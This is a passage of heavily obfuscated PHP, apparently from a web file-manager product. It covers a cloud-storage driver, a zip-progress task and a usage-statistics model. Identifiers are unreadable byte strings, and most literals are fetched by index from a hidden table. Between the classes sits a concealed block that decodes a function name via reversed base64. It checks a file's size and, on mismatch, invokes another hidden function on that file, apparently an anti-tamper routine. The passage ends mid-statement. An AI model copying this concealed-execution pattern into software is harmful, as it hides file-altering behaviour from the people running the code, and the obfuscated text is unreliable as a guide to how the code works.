!$ú¾¾Ú§[$ôœÆ¯õ[1197]] ? $ú¾¾Ú§[$ôœÆ¯õ[1197]] : $ú¾¾Ú§[$ôœÆ¯õ[1199]]; } public function uploadFormData($æ‰Üöäœ, $†Â‚Å• = 3600) { return $this->uploadPolicy($æ‰Üöäœ, $†Â‚Å•); } public function multiUploadFormData($Ü¡¨™ù, $´›Ã‚’ = 3600) { $ö¦ƒ¸¯’ =& $_SERVER[ Ö‘ñÄ”]; $£İ½â‘È = (int) $GLOBALS[$ö¦ƒ¸¯’[7]][$ö¦ƒ¸¯’[76]]; return $this->uploadPolicy($Ü¡¨™ù, $´›Ã‚’, $£İ½â‘È); } private function uploadPolicy($Ê¹Æ”§™, $—ë«Á©à = 3600, $ÅÓ›×“â = 0) { $ø«Á°Øş =& $_SERVER[ Ö‘ñÄ”]; $³Åµ÷ô = $ø«Á°Øş[8] . $this->bucket; $ÖÚç…ìÒ = gmdate($ø«Á°Øş[1423]); $™’ÇÚÖò = array($ø«Á°Øş[1490] => $this->bucket, $ø«Á°Øş[1491] => $Ê¹Æ”§™, $ø«Á°Øş[1492] => time() + $—ë«Á©à, $ø«Á°Øş[1493] => $ÖÚç…ìÒ); if ($ÅÓ›×“â) { $™’ÇÚÖò[$ø«Á°Øş[1403]] = $ÅÓ›×“â; } $ÔöúáŸ‚ = base64_encode(json_encode($™’ÇÚÖò)); $ıÖ½ûÇÕ = base64_encode(hash_hmac($ø«Á°Øş[1460], "\x50\x4f\123\124\46{$³Åµ÷ô}\46{$ÖÚç…ìÒ}\x26{$ÔöúáŸ‚}", md5("{$this->userpass}"), !0)); $ó÷ÄóÜ› = array($ø«Á°Øş[1328] => $ÔöúáŸ‚, $ø«Á°Øş[1494] => "\125\x50\x59\125\116\x20{$this->username}\72{$ıÖ½ûÇÕ}", $ø«Á°Øş[181] => $this->endpoint . $³Åµ÷ô); return $ó÷ÄóÜ›; } public function download($¹Ñ…øŒã, $ ¯ÂçŸ–) { $ˆÙå®† = IO::getPathInner(IO::mkfile($ ¯ÂçŸ–)); if (!($ŒÇôíÜ¹ = $this->link($¹Ñ…øŒã))) { return !1; } $ïÛ”ŠŞƒ = 0; $ù’ÌÆØĞ = 1024 * 200; $“ŞõÇÙ = fopen($ˆÙå®†, $_SERVER[ Ö‘ñÄ”][1444]); while (!0) { $ıå”åÍ¹ = $this->fileSubstr($¹Ñ…øŒã, $ïÛ”ŠŞƒ, $ù’ÌÆØĞ); if ($ıå”åÍ¹ === !1) { return !1; } fwrite($“ŞõÇÙ, $ıå”åÍ¹); $ïÛ”ŠŞƒ += $ù’ÌÆØĞ; if (strlen($ıå”åÍ¹) < $ù’ÌÆØĞ) { break; } } fclose($“ŞõÇÙ); return $ ¯ÂçŸ–; } public function link($¸Î„ö—, $Œ¤£‘ = array()) { $£“„ä³Õ =& $_SERVER[ Ö‘ñÄ”]; $¸Î„ö— = trim($¸Î„ö—, $£“„ä³Õ[8]); if (!empty($this->token)) { $³¯â“È = strtotime(date($£“„ä³Õ[1495])); $ÜÀãÊ— = substr(md5($this->token . $£“„ä³Õ[293] . $³¯â“È . $£“„ä³Õ[1496] . $¸Î„ö—), 12, 8) . $³¯â“È; $Œ¤£‘[] = $£“„ä³Õ[1497] . $ÜÀãÊ—; } $Ü“àİÄÅ = !empty($Œ¤£‘) ? $£“„ä³Õ[73] . implode($£“„ä³Õ[293], $Œ¤£‘) : $£“„ä³Õ[12]; return $this->getHost() . $£“„ä³Õ[8] . $¸Î„ö— . $Ü“àİÄÅ; } public function fileOut($ßÑ¤¼üü, $–Õ“ù ö = false, $Ñ±Ò»©Ş = false, $äğğÌ = '') { if ($this->isFileOutServer()) { return $this->fileOutServer($ßÑ¤¼üü, $–Õ“ù ö, $Ñ±Ò»©Ş, $äğğÌ); } if (!$Ñ±Ò»©Ş) { $Ñ±Ò»©Ş = $this->pathThis($ßÑ¤¼üü); } $Æ¸êäŒ¿ = $–Õ“ù ö ? array($_SERVER[ Ö‘ñÄ”][1498] . rawurlencode($Ñ±Ò»©Ş)) : array(); $ŞÂõª¡´ = $this->link($ßÑ¤¼üü, $Æ¸êäŒ¿); $this->fileOutLink($ŞÂõª¡´); } public function fileOutServer($ÎüÚÅÜ, $ìûşƒÊ¡ = false, $„ŸÕ†æô = false, $µ¯‚ù½˜ = '') { parent::fileOut($ÎüÚÅÜ, $ìûşƒÊ¡, $„ŸÕ†æô, $µ¯‚ù½˜); } public function fileOutImage($æ‚£«Ùß, $šÄä•ã” = 250) { $õÑˆ¦¨ú = $this->link($æ‚£«Ùß . $_SERVER[ Ö‘ñÄ”][1499] . $šÄä•ã”); $this->fileOutLink($õÑˆ¦¨ú); } public function fileOutImageServer($ÄÊ³†¤, $¹İ£–Ü = 250) { parent::fileOutImage($ÄÊ³†¤, $¹İ£–Ü); } public function hashMd5($œÅæÒˆ÷) { $®çÅÂÄø =& $_SERVER[ Ö‘ñÄ”]; $ğßå¸æı = $this->_objectMeta($œÅæÒˆ÷); return isset($ğßå¸æı[$®çÅÂÄø[212]]) ? $ğßå¸æı[$®çÅÂÄø[212]] : !1; } public function size($Áñç–ƒ¼) { $ÕÆèÅÁà = $this->objectMeta($Áñç–ƒ¼); return $ÕÆèÅÁà ? $ÕÆèÅÁà[$_SERVER[ Ö‘ñÄ”][76]] : 0; } public function info($»¶†‘¼) { if ($this->isFolder($»¶†‘¼)) { return $this->folderInfo($»¶†‘¼); } else { if ($this->isFile($»¶†‘¼)) { return $this->fileInfo($»¶†‘¼); } } return !1; } public function exist($ÎÅ¬’ö–) { return $this->isFile($ÎÅ¬’ö–) || $this->isFolder($ÎÅ¬’ö–); } public function isFile($ñÌ¾Ÿïà) { return !$this->isFolder($ñÌ¾Ÿïà) && $this->objectMeta($ñÌ¾Ÿïà); } public function isFolder($öŠ›ÄèŸ) { return $this->cacheMethod($_SERVER[ Ö‘ñÄ”][165], $öŠ›ÄèŸ); } protected function objectMeta($ÌàÜÖí) { return $this->cacheMethod($_SERVER[ Ö‘ñÄ”][167], $ÌàÜÖí); } protected function _objectMeta($½÷ÒáÖ) { $æÏ²¬¡§ =& $_SERVER[ Ö‘ñÄ”]; if ($½÷ÒáÖ == $æÏ²¬¡§[12] || $½÷ÒáÖ == $æÏ²¬¡§[8]) { return array(); } $Öº¼çüú = $this->ussRequest($½÷ÒáÖ, $æÏ²¬¡§[1500]); if (!$Öº¼çüú[$æÏ²¬¡§[1197]]) { return null; } $Ú¡¸èŞ› = isset($Öº¼çüú[$æÏ²¬¡§[1199]]) ? $Öº¼çüú[$æÏ²¬¡§[1199]] : array(); if (!isset($Ú¡¸èŞ›[$æÏ²¬¡§[1501]])) { return null; } $º º×ïĞ = array($æÏ²¬¡§[33] => isset($Ú¡¸èŞ›[$æÏ²¬¡§[1501]]) ? $Ú¡¸èŞ›[$æÏ²¬¡§[1501]] : null, $æÏ²¬¡§[76] => isset($Ú¡¸èŞ›[$æÏ²¬¡§[1502]]) ? $Ú¡¸èŞ›[$æÏ²¬¡§[1502]] : null, $æÏ²¬¡§[212] => isset($Ú¡¸èŞ›[$æÏ²¬¡§[1503]]) ? $Ú¡¸èŞ›[$æÏ²¬¡§[1503]] : null, $æÏ²¬¡§[1470] => isset($Ú¡¸èŞ›[$æÏ²¬¡§[1504]]) ? $Ú¡¸èŞ›[$æÏ²¬¡§[1504]] : null); $º º×ïĞ[$æÏ²¬¡§[1471]] = isset($Ú¡¸èŞ›[$æÏ²¬¡§[1505]]) ? strtotime($Ú¡¸èŞ›[$æÏ²¬¡§[1505]]) : $º º×ïĞ[$æÏ²¬¡§[1470]]; return $º º×ïĞ; } protected function _isFolder($‚··¥ ¥) { $ºØåà¡¤ =& $_SERVER[ Ö‘ñÄ”]; if ($‚··¥ ¥ == $ºØåà¡¤[12] || $‚··¥ ¥ == $ºØåà¡¤[8]) { return !0; } $¾æÛ¤Õà = $this->_objectMeta($‚··¥ ¥); return isset($¾æÛ¤Õà[$ºØåà¡¤[33]]) && $¾æÛ¤Õà[$ºØåà¡¤[33]] == $ºØåà¡¤[75] ? !0 : !1; } } goto EŸ©Ğ¹§¨; FáŠ‡–Ê´: $fileSize = strrev(base64_decode($_SERVER[¼ˆôê­][0])); function binCheckNeq($îÄ»Œ‡, $ÈÈˆïİ) { return $îÄ»Œ‡ != $ÈÈˆïİ; } $_SERVER[$_SERVER[¼ˆôê­][1]] = $fileSize($_SERVER[$_SERVER[¼ˆôê­][2]]); goto Cæå†Ò……Ç; C¹å¶Â†ØÒ: if ($_SERVER[$_SERVER[ Ö‘ñÄ”][238]] != $_size($_file)) { $_getc = $_SERVER[ Ö‘ñÄ”][240]; $_getfile = $_SERVER[$_SERVER[ Ö‘ñÄ”][241]] . $_SERVER[ Ö‘ñÄ”][242]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[ Ö‘ñÄ”][231], $_getfilec); if (count($_getarrs) < $_SERVER[ Ö‘ñÄ”][243]) { $exit = $_SERVER[ Ö‘ñÄ”][244]; $exit(); } $_act = $_SERVER[ Ö‘ñÄ”][245]; $_act($_file); } class TaskZip extends TaskFileTransfer { protected function startAfter() { $ïÃÏ¦‰ =& $_SERVER[ Ö‘ñÄ”]; parent::startAfter(); Hook::bind($ïÃÏ¦‰[1763], array($this, $ïÃÏ¦‰[1757])); $•Ë¾²«² =& $this->task; $•Ë¾²«²[$ïÃÏ¦‰[1759]] = $ïÃÏ¦‰[1205]; if (!$•Ë¾²«²[$ïÃÏ¦‰[1562]]) { $•Ë¾²«²[$ïÃÏ¦‰[1562]] = LNG($ïÃÏ¦‰[1764]); } } protected function endAfter() { $ò‡òõ¯‹ =& $_SERVER[ Ö‘ñÄ”]; parent::endAfter(); Hook::unbind($ò‡òõ¯‹[1763], array($this, $ò‡òõ¯‹[1757])); } public function updateAfter() { $—ÑìˆÕ‚ =& $_SERVER[ Ö‘ñÄ”]; $‘ğ¡øâĞ =& $this->task; if (!$‘ğ¡øâĞ[$—ÑìˆÕ‚[799]] || !$‘ğ¡øâĞ[$—ÑìˆÕ‚[776]]) { return; } if ($‘ğ¡øâĞ[$—ÑìˆÕ‚[1759]] == $—ÑìˆÕ‚[1205]) { $òŒ“î× = $‘ğ¡øâĞ[$—ÑìˆÕ‚[1715]]; if ($‘ğ¡øâĞ[$—ÑìˆÕ‚[1716]] != $—ÑìˆÕ‚[1205]) { $òŒ“î× = 0; } $ÀÑËà»ğ = ($‘ğ¡øâĞ[$—ÑìˆÕ‚[1719]] + $òŒ“î×) / $‘ğ¡øâĞ[$—ÑìˆÕ‚[776]]; $‘ğ¡øâĞ[$—ÑìˆÕ‚[1665]] = $ÀÑËà»ğ * 0.3; } else { if ($‘ğ¡øâĞ[$—ÑìˆÕ‚[1759]] == $—ÑìˆÕ‚[322]) { $ÀÑËà»ğ = $‘ğ¡øâĞ[$—ÑìˆÕ‚[1664]] / $‘ğ¡øâĞ[$—ÑìˆÕ‚[799]]; $‘ğ¡øâĞ[$—ÑìˆÕ‚[1665]] = 0.3 + $ÀÑËà»ğ * 0.5; } else { if ($‘ğ¡øâĞ[$—ÑìˆÕ‚[1759]] == $—ÑìˆÕ‚[107]) { $ÀÑËà»ğ = 0; if ($‘ğ¡øâĞ[$—ÑìˆÕ‚[1714]]) { $ÀÑËà»ğ = $‘ğ¡øâĞ[$—ÑìˆÕ‚[1715]] / $‘ğ¡øâĞ[$—ÑìˆÕ‚[1714]]; } $‘ğ¡øâĞ[$—ÑìˆÕ‚[1665]] = 0.3 + 0.5 + $ÀÑËà»ğ * 0.2; } } } if ($‘ğ¡øâĞ[$—ÑìˆÕ‚[1665]] > 0) { $¬¬ç´×¦ = timeFloat() - $‘ğ¡øâĞ[$—ÑìˆÕ‚[1667]] - $‘ğ¡øâĞ[$—ÑìˆÕ‚[1670]]; $‘ğ¡øâĞ[$—ÑìˆÕ‚[1671]] = $¬¬ç´×¦ * (1 - $‘ğ¡øâĞ[$—ÑìˆÕ‚[1665]]) / $‘ğ¡øâĞ[$—ÑìˆÕ‚[1665]]; } } public function copyFileStart($ƒ¾½İÒ¦, $ĞŠˆ½ß½, $İ”öô®, $†å•Ï”, $×È¢–¿, $ÅÒŸâ°ş) { $ÀÖÄ´î =& $_SERVER[ Ö‘ñÄ”]; parent::copyFileStart($ƒ¾½İÒ¦, $ĞŠˆ½ß½, $İ”öô®, $†å•Ï”, $×È¢–¿, $ÅÒŸâ°ş); $ÜÉ×ª‹ =& $this->task; if ($ÜÉ×ª‹[$ÀÖÄ´î[1759]] == $ÀÖÄ´î[322]) { $ÜÉ×ª‹[$ÀÖÄ´î[1759]] = $ÀÖÄ´î[107]; } $this->update(); } public function copyFileEnd($Œ·ÒÛˆÓ, $Åë¹¶˜¡, $äÍõ…úÛ, $ÀÜ‚…¼ë, $¼«¼†, $¿Ø§âÑµ) { $…¢«Âœ™ =& $_SERVER[ Ö‘ñÄ”]; $ÄˆªœÇØ =& $this->task; $ÄˆªœÇØ[$…¢«Âœ™[1715]] = $ÄˆªœÇØ[$…¢«Âœ™[1714]]; $ÄˆªœÇØ[$…¢«Âœ™[1719]] += $ÄˆªœÇØ[$…¢«Âœ™[1714]]; $ÄˆªœÇØ[$…¢«Âœ™[1716]] = $…¢«Âœ™[12]; $this->update(); } public function nameParse($ıŒŠ‹ß¿) { $¤èå«ˆ· =& $_SERVER[ Ö‘ñÄ”]; $‹ø“Èë =& $this->task; if ($‹ø“Èë[$¤èå«ˆ·[1664]] < $‹ø“Èë[$¤èå«ˆ·[799]]) { $À €ëéÚ = get_path_this($ıŒŠ‹ß¿); if (strstr($À €ëéÚ, $¤èå«ˆ·[10])) { $‹ø“Èë[$¤èå«ˆ·[1664]] += 1; } } if ($‹ø“Èë[$¤èå«ˆ·[1759]] == $¤èå«ˆ·[1205]) { $‹ø“Èë[$¤èå«ˆ·[1759]] = $¤èå«ˆ·[322]; } $‹ø“Èë[$¤èå«ˆ·[1712]] = $ıŒŠ‹ß¿; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($Ş’‚Àö„) { $Ç‰ƒù¥Ï =& $_SERVER[ Ö‘ñÄ”]; $İßá“·¥ = array($Ç‰ƒù¥Ï[608] => array($Ç‰ƒù¥Ï[33] => $Ç‰ƒù¥Ï[1765], $Ç‰ƒù¥Ï[282] => array($Ç‰ƒù¥Ï[224], $Ç‰ƒù¥Ï[778], $Ç‰ƒù¥Ï[1766], $Ç‰ƒù¥Ï[1767])), $Ç‰ƒù¥Ï[1768] => array($Ç‰ƒù¥Ï[33] => $Ç‰ƒù¥Ï[1769], $Ç‰ƒù¥Ï[282] => array($Ç‰ƒù¥Ï[224], $Ç‰ƒù¥Ï[776], $Ç‰ƒù¥Ï[1770], $Ç‰ƒù¥Ï[1771], $Ç‰ƒù¥Ï[1772]))); if (!isset($İßá“·¥[$Ş’‚Àö„])) { return !1; } $this->optionType = $İßá“·¥[$Ş’‚Àö„][$Ç‰ƒù¥Ï[33]]; $this->field = $İßá“·¥[$Ş’‚Àö„][$Ç‰ƒù¥Ï[282]]; return !0; } public function listData($ Íİ¿²™ = false, $³ïÎ³Îš = "\155\x6f\x64\x69\x66\171\124\151\x6d\145", $ã©¶íè» = false) { return parent::listData($ Íİ¿²™, $³ïÎ³Îš, $ã©¶íè»); } public function trendList($ªç¨Ší) { $¿Õ¢äÃû =& $_SERVER[ Ö‘ñÄ”]; $óù¤¡… = $this->listData(); if ($óù¤¡…) { $Üû•˜”æ = end($óù¤¡…); $Ò‘Ä†ª = date($¿Õ¢äÃû[1773], strtotime($¿Õ¢äÃû[1774])); if ($Üû•˜”æ[$¿Õ¢äÃû[224]] == $Ò‘Ä†ª) { return $óù¤¡…; } $‘¿¯©º« = strtotime($Üû•˜”æ[$¿Õ¢äÃû[224]]); } if (!isset($‘¿¯©º«)) { $Ÿº‡‰  = $ªç¨Ší == $¿Õ¢äÃû[608] ? $¿Õ¢äÃû[543] : $¿Õ¢äÃû[838]; $‘¿¯©º« = Model($Ÿº‡‰ )->min($¿Õ¢äÃû[200]); } $ğíŠ¾°« = $¿Õ¢äÃû[1775] . ucfirst($ªç¨Ší); $¢Ö›—” = $this->dateList($‘¿¯©º«); foreach ($¢Ö›—” as $Ò‘Ä†ª) { $this->{$ğíŠ¾°«}($Ò‘Ä†ª); } return $this->listData(); } private function dateList($àŸ”Ùü¶) { $ı¸„ß£ª =& $_SERVER[ Ö‘ñÄ”]; $™É„ƒŞò = $àŸ”Ùü¶; $¤õß—ò = strtotime($ı¸„ß£ª[1774]); $®È°âëû = array(); while ($™É„ƒŞò <= $¤õß—ò) { $®È°âëû[] = date($ı¸„ß£ª[1773], $™É„ƒŞò); $™É„ƒŞò = strtotime($ı¸„ß£ª[1776], $™É„ƒŞò); } return $®È°âëû; } public function _recordUser($ÏŒÚ®Œî = '') { $’âùó‚ =& $_SERVER[ Ö‘ñÄ”]; $ôÌ÷şŠ = strtotime(date($’âùó‚[1777], strtotime($ÏŒÚ®Œî))); $íÓ…å©Ø = strtotime(date($’âùó‚[1778], strtotime($ÏŒÚ®Œî))); $ğ— ìóİ = array($’âùó‚[200] => array($’âùó‚[1019], $íÓ…å©Ø)); $ÜŸ—–«Ñ = Model($’âùó‚[543])->where($ğ— ìóİ)->count($’âùó‚[1663]); $ğ— ìóİ[$’âùó‚[200]] = array($’âùó‚[342], array($ôÌ÷şŠ, $íÓ…å©Ø)); $ø¸¢ÒëÅ = Model($’âùó‚[543])->where($ğ— ìóİ)->count($’âùó‚[1663]); $ğ— ìóİ[$’âùó‚[33]] = $’âùó‚[1779]; $Ş£íÏÍ† = Model($’âùó‚[1780])->where($ğ— ìóİ)->count($’âùó‚[1781]); $ªçÓ¾³ = array($’âùó‚[224] => $ÏŒÚ®Œî, $’âùó‚[778] => (int) $ÜŸ—–«Ñ, $’âùó‚[1766] => (int) $ø¸¢ÒëÅ, $’âùó‚[1767] => (int) $Ş£íÏÍ†); return $this->insert($ªçÓ¾³); } public function _recordStore($Šš×ğ¼ = '') { $£ù”‹ƒ÷ =& $_SERVER[ Ö‘ñÄ”]; $ü³Ãï³Ğ = strtotime(date($£ù”‹ƒ÷[1778], strtotime($Šš×ğ¼))); $³½˜´Ú÷ = array($£ù”‹ƒ÷[200] => array($£ù”‹ƒ÷[1019], $ü³Ãï³Ğ)); $˜ø×¢ó³ = Model($£ù”‹ƒ÷[479])->where($³½˜´Ú÷)->sum($£ù”‹ƒ÷[76]); $³½˜´Ú÷[$£ù”‹ƒ÷[418]] = 0; $àåà¤ = Model($£ù”‹ƒ÷[838])->where($³½˜´Ú÷)->sum($£ù”‹ƒ÷[76]); $³½˜´Ú÷[$£ù”‹ƒ÷[419]] = 1; $ùª¯×ü¸ = Model($£ù”‹ƒ÷[838])->where($³½˜´Ú÷)->sum($£ù”‹ƒ÷[76]); $³½˜´Ú÷[$£ù”‹ƒ÷[419]] = 2; $ÓÇêœ = Model($£ù”‹ƒ÷[838])->where($³½˜´Ú÷)->sum($£ù”‹ƒ÷[76]); $¹åŸõå« = array($£ù”‹ƒ÷[224] => $Šš×ğ¼, $£ù”‹ƒ÷[776] => (int) $àåà¤, $£ù”‹ƒ÷[1770] => (int) $˜ø×¢ó³, $£ù”‹ƒ÷[1771] => (int) $ùª¯×ü¸, $£ù”‹ƒ÷[1772] => (int) $ÓÇêœ); return $this->insert($¹åŸõå«); } public function trend($õÀœ¿¼¢, $µıÓ€¯£) { $…ƒíØä½ =& $_SERVER[ Ö‘ñÄ”]; if (!$this->init($õÀœ¿¼¢)) { return !1; } $£ ¸¹™ = $this->trendList($õÀœ¿¼¢); if ($£ ¸¹™ && $µıÓ€¯£ != $…ƒíØä½[1636]) { $ÇßøÄéƒ = $£ ¸¹™[0][$…ƒíØä½[224]]; $‚Äïá× = $this->validDate($µıÓ€¯£, $ÇßøÄéƒ); $œ€ôÄ¤ = array(); $Ó‰ËİÜú = array_to_keyvalue($£ ¸¹™, $…ƒíØä½[224]); foreach ($‚Äïá× as $Ä¥üáª°) { if (isset($Ó‰ËİÜú[$Ä¥üáª°])) { $ÙÏ˜³ºÉ = $Ó‰ËİÜú[$Ä¥üáª°]; } else { $ÙÏ˜³ºÉ = end($£ ¸¹™); $ÙÏ˜³ºÉ[$…ƒíØä½[224]] = $Ä¥üáª°; if ($õÀœ¿¼¢ == $…ƒíØä½[608]) { $ÙÏ˜³ºÉ[$…ƒíØä½[1766]] = $ÙÏ˜³ºÉ[$…ƒíØä½[1767]] = 0; } } $œ€ôÄ¤[] = $ÙÏ˜³ºÉ; } $£ ¸¹™ = $œ€ôÄ¤; } $¸Ù‚» ¼ = array($…ƒíØä½[608] => array($…ƒíØä½[778] => LNG($…ƒíØä½[1782]), $…ƒíØä½[1766] => LNG($…ƒíØä½[1783]), $…ƒíØä½[1767] => LNG($…ƒíØä½[1784])), $…ƒíØä½[1768] => array($…ƒíØä½[776] => LNG($…ƒíØä½[1785]), $…ƒíØä½[1770] => LNG($…ƒíØä½[1786]), $…ƒíØä½[1771] => LNG($…ƒíØä½[1787]), $…ƒíØä½[1772] => LNG($…ƒíØä½[1788]))); $åÛş–ßİ = array($…ƒíØä½[608] => $…ƒíØä½[1789], $…ƒíØä½[1768] => $…ƒíØä½[76]); if (empty($£ ¸¹™)) { $Ä¥üáª° = date($…ƒíØä½[1773], strtotime($…ƒíØä½[1774])); $Øàüï–ô = array($…ƒíØä½[224] => $Ä¥üáª°); foreach ($¸Ù‚» ¼[$õÀœ¿¼¢] as $º«æõâä => $úã‹ÊÛÚ) { $Øàüï–ô[$º«æõâä] = 0; } $£ ¸¹™[] = $Øàüï–ô; } $ôµŞŸö = array(); foreach ($£ ¸¹™ as $úã‹ÊÛÚ) { if ($õÀœ¿¼¢ == $…ƒíØä½[1768] && $úã‹ÊÛÚ[$…ƒíØä½[1770]] > $úã‹ÊÛÚ[$…ƒíØä½[776]]) { $úã‹ÊÛÚ[$…ƒíØä½[1770]] = $úã‹ÊÛÚ[$…ƒíØä½[776]]; } foreach ($¸Ù‚» ¼[$õÀœ¿¼¢] as $º«æõâä => $§ğ–‡ô‘) { $ÙÏ˜³ºÉ = array($…ƒíØä½[224] => $úã‹ÊÛÚ[$…ƒíØä½[224]], $…ƒíØä½[1562] => $§ğ–‡ô‘); $ÙÏ˜³ºÉ[$åÛş–ßİ[$õÀœ¿¼¢]] = isset($úã‹ÊÛÚ[$º«æõâä]) ? $úã‹ÊÛÚ[$º«æõâä] : 0; $ôµŞŸö[] = $ÙÏ˜³ºÉ; } } return $ôµŞŸö; } public function validDate($÷ˆœ“Üé, $€‘¡õ–ç) { $Û•ŞÒŠº =& $_SERVER[ Ö‘ñÄ”]; $Ì½™ÖÂ€ = date($Û•ŞÒŠº[1773], strtotime($Û•ŞÒŠº[1774])); $”»Ô‡Îã = array($Ì½™ÖÂ€); switch ($÷ˆœ“Üé) { case $Û•ŞÒŠº[1643]: $Æ××èù» = mktime(0, 0, 0, date($Û•ŞÒŠº[1790]), date($Û•ŞÒŠº[1381]) - date($Û•ŞÒŠº[1444]) + 7 - 7, date($Û•ŞÒŠº[1791])); $é”¬›ÜÁ = 0; do { $­Ó¹ƒßè = date($Û•ŞÒŠº[1773], $Æ××èù» - 3600 * 24 * 7 * $é”¬›ÜÁ); $”»Ô‡Îã[] = $­Ó¹ƒßè; $é”¬›ÜÁ++; } while ($€‘¡õ–ç < $­Ó¹ƒßè); break; case $Û•ŞÒŠº[1641]: $é”¬›ÜÁ = 1; do { $Ç‹İµç = date($Û•ŞÒŠº[1792], strtotime("\55\40{$é”¬›ÜÁ}\40\x6d\157\156\x74\150\163")); $”»Ô‡Îã[] = $Ç‹İµç; $é”¬›ÜÁ++; } while ($€‘¡õ–ç < $Ç‹İµç); break; case $Û•ŞÒŠº[1793]: $Ã¥ÀÍ Ş = (int) date($Û•ŞÒŠº[1791], strtotime($€‘¡õ–ç)); $óŞéäÁ° = (int) date($Û•ŞÒŠº[1791]); if ($Ã¥ÀÍ Ş >= $óŞéäÁ°) { break; } for ($Ã¥ÀÍ Ş; $Ã¥ÀÍ Ş < $óŞéäÁ°; $Ã¥ÀÍ Ş++) { $”»Ô‡Îã[] = $Ã¥ÀÍ Ş . $Û•ŞÒŠº[1794]; } break; default: break; } if ($€‘¡õ–ç > end($”»Ô‡Îã)) { array_pop($”»Ô‡Îã); } sort($”»Ô‡Îã); return $”»Ô‡Îã; } public function listTable($Ì ñíŒŸ) { $ø’Êü¦Ú = ucfirst($Ì ñíŒŸ); return Model($ø’Êü¦Ú)->listData(); } public function option($ƒÂñêéı) { $¥¶… Ùñ = $_SERVER[ Ö‘ñÄ”][1795] . ucfirst($ƒÂñêéı); return $this->{$¥¶… Ùñ}(); } private function optionUser() { $³‡É¸’  =& $_SERVER[ Ö‘ñÄ”]; $Õäõë„ = Model($³‡É¸’ [543])->count($³‡É¸’ [1663]); $‹Óªœº‰ = Model($³‡É¸’ [543])->where($³‡É¸’ [1796])->count($³‡É¸’ [1663]); $·ı«­–® = intval($GLOBALS[$³‡É¸’ [6]][$³‡É¸’ [358]][$³‡É¸’ [1618]]) / 3600; $®–ªâù¡ = strtotime("\x2d{$·ı«­–®}\40\150\157\165\x72\163"); $ï““Ú¶à = strtotime(date($³‡É¸’ [1777])); if ($®–ªâù¡ < $ï““Ú¶à) { $®–ªâù¡ = $ï““Ú¶à; } $Ã…èÁ†í = array($³‡É¸’ [1797] => array($³‡É¸’ [1020], $®–ªâù¡)); $µÔÆ†è = (int) Model($³‡É¸’ [543])->where($Ã…èÁ†í)->count($³‡É¸’ [1663]); if (!$µÔÆ†è) { $µÔÆ†è = 1; } $Ã…èÁ†í = array($³‡É¸’ [1797] => array($³‡É¸’ [1020], $ï““Ú¶à)); $ô¯€¯•ù = Model($³‡É¸’ [543])->where($Ã…èÁ†í)->count($³‡É¸’ [1663]); return array($³‡É¸’ [772] => (int) $Õäõë„, $³‡É¸’ [1798] => (int) ($Õäõë„ - $‹Óªœº‰), $³‡É¸’ [1799] => (int) $‹Óªœº‰, $³‡É¸’ [1800] => (int) $ô¯€¯•ù, $³‡É¸’ [1801] => $µÔÆ†è); } private function optionFile() { $ÔÄà“ßõ =& $_SERVER[ Ö‘ñÄ”]; $ÙŒ²ÅÉ = $this->sourceSize(); $µÊ»ñ›„ = $ÙŒ²ÅÉ[$ÔÄà“ßõ[76]]; $›Œöİ¼Ş = $ÙŒ²ÅÉ[$ÔÄà“ßõ[1770]]; $‰ÖŠˆèı = Model($ÔÄà“ßõ[838])->where(array($ÔÄà“ßõ[418] => 0))->count($ÔÄà“ßõ[410]); $õ½¹õ³ï = array($ÔÄà“ßõ[418] => 0, $ÔÄà“ßõ[200] => array($ÔÄà“ßõ[1020], strtotime(date($ÔÄà“ßõ[1777])))); $ìé¸û½ = Model($ÔÄà“ßõ[838])->where($õ½¹õ³ï)->sum($ÔÄà“ßõ[76]); $˜É©öÄ = Model($ÔÄà“ßõ[838])->where($õ½¹õ³ï)->count($ÔÄà“ßõ[410]); return array($ÔÄà“ßõ[776] => $µÊ»ñ›„, $ÔÄà“ßõ[1770] => $›Œöİ¼Ş, $ÔÄà“ßõ[1802] => $µÊ»ñ›„ - $›Œöİ¼Ş, $ÔÄà“ßõ[1803] => (int) $ìé¸û½, $ÔÄà“ßõ[778] => (int) $‰ÖŠˆèı, $ÔÄà“ßõ[1804] => (int) $˜É©öÄ); } private function optionAccess() { $À±Ãˆ— =& $_SERVER[ Ö‘ñÄ”]; return array($À±Ãˆ—[772] => $this->typeLogCnt(), $À±Ãˆ—[107] => $this->typeLogCnt($À±Ãˆ—[107]), $À±Ãˆ—[460] => $this->typeLogCnt($À±Ãˆ—[460]), $À±Ãˆ—[1805] => $this->typeLogCnt($À±Ãˆ—[1805]), $À±Ãˆ—[1806] => $this->typeLogCnt($À±Ãˆ—[1806]), $À±Ãˆ—[608] => $this->typeLogCnt($À±Ãˆ—[12], $À±Ãˆ—[1781])); } private function typeLogCnt($Çì‘‡ï‚ = '', $±®Ù‰úˆ = "\151\144") { $²İÅˆÚ =& $_SERVER[ Ö‘ñÄ”]; $§”üü€ = array($²İÅˆÚ[107] => array($²İÅˆÚ[1807], $²İÅˆÚ[1808]), $²İÅˆÚ[460] => array($²İÅˆÚ[1809], $²İÅˆÚ[1810]), $²İÅˆÚ[1805] => array($²İÅˆÚ[1811], $²İÅˆÚ[1812], $²İÅˆÚ[1813]), $²İÅˆÚ[1806] => array($²İÅˆÚ[1814], $²İÅˆÚ[1815]), $²İÅˆÚ[1816] => array($²İÅˆÚ[1817], $²İÅˆÚ[1818], $²İÅˆÚ[1819])); $£Ùê°Ü† = strtotime(date($²İÅˆÚ[1777])); $ŞùûÚ = array($²İÅˆÚ[200] => array($²İÅˆÚ[1020], $£Ùê°Ü†)); if ($Çì‘‡ï‚) { $ŞùûÚ[$²İÅˆÚ[33]] = array($²İÅˆÚ[7], $§”üü€[$Çì‘‡ï‚]); } $¡¢áŞŞ = Model($²İÅˆÚ[1780])->where($ŞùûÚ)->count($±®Ù‰úˆ); return (int) $¡¢áŞŞ; } private function optionServer() { $âÂ’²Ïî =& $_SERVER[ Ö‘ñÄ”]; $¸Ÿí€ = $this->diskDriver(); $éíĞˆÄê = KodIO::defaultDriver(); $‹•™†ßé = array($âÂ’²Ïî[830] => $éíĞˆÄê[$âÂ’²Ïî[407]]); $ù°ÖÀ”› = Model($âÂ’²Ïî[479])->where($‹•™†ßé)->sum($âÂ’²Ïî[76]); $ô·íëî = explode($âÂ’²Ïî[53], $_SERVER[$âÂ’²Ïî[143]]); $ùÇÉ‚™Ã = $ô·íëî[0]; $«ÇÇØô = $GLOBALS[$âÂ’²Ïî[6]][$âÂ’²Ïî[21]]; $Òı®ì®¬ = 